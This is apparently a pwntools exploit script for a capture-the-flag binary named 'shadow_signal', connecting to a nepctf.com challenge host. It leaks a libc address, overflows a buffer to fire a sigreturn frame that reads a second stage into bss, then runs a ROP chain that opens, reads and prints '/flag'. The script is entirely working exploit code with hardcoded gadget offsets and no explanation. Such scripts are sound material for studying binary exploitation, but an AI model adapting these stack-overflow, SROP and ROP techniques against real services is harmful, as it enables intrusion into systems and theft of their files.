from pwn import *

context.arch = "amd64"
context.os = "linux"
context.kernel = "amd64"
io = remote("g6l3r9r0-nps4-am2k-4fwd-6a5b0a8b30136-neptune.nepctf.com", 443, ssl=True)
#io = process("./shadow_signal")
elf = ELF("./shadow_signal")
libc = ELF("./libc.so.6")

_IO_stdout_offset = 0x21B780

io.recvuntil(b"gift: ")
stdout = int(io.recv(14), 16)
print("_IO_2_1_stdout_ address =", hex(stdout))
libc_base = stdout - _IO_stdout_offset
print("libc base address =", hex(libc_base))

restore_rt = libc_base + 0x42520
bss = 0x405000
syscall_ret = libc_base + 0x91316
popRdi = libc_base + 0x2A3E5
popRsi = libc_base + 0x2BE51
popRdxRbx = libc_base + 0x904A9
popRax = libc_base + 0x45eb0
xchg_edi_eax = libc_base + 0x164f9e
io.send(b"a" * 8)

frame = SigreturnFrame() 
frame.rax = 0
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x500
frame.rsp = bss
frame.rip = syscall_ret
#frame.eflags = 0x202
#frame.csgsfs = 0x33
#frame["uc_stack.ss_flags"] = 2


payload = b"\x00" * 0x110
payload += p64(0)
payload += p64(restore_rt)
payload += bytes(frame)
payload += b"\x00" * (0x500 - len(payload))

io.recvuntil(b"signal")
io.send(payload)

flag_addr = bss + 0x100

rop = b""
# open("flag", O_RDONLY)
rop += p64(popRdi) + p64(flag_addr)
rop += p64(popRsi) + p64(0)
rop += p64(popRax) + p64(2)
rop += p64(syscall_ret)

#read(fd, buf, 0x100)
rop += p64(xchg_edi_eax)
rop += p64(popRsi) + p64(flag_addr)
rop += p64(popRdxRbx) + p64(0x100) + p64(0)
rop += p64(popRax) + p64(0)
rop += p64(syscall_ret)

# write(1, buf, 0x100)
rop += p64(popRdi) + p64(1)
rop += p64(popRsi) + p64(flag_addr)
rop += p64(popRdxRbx) + p64(0x100) + p64(0)
rop += p64(popRax) + p64(1)
rop += p64(syscall_ret)

rop = rop.ljust(flag_addr - bss, b"\x00")
rop += b"/flag\x00"
io.send(rop)

io.interactive()
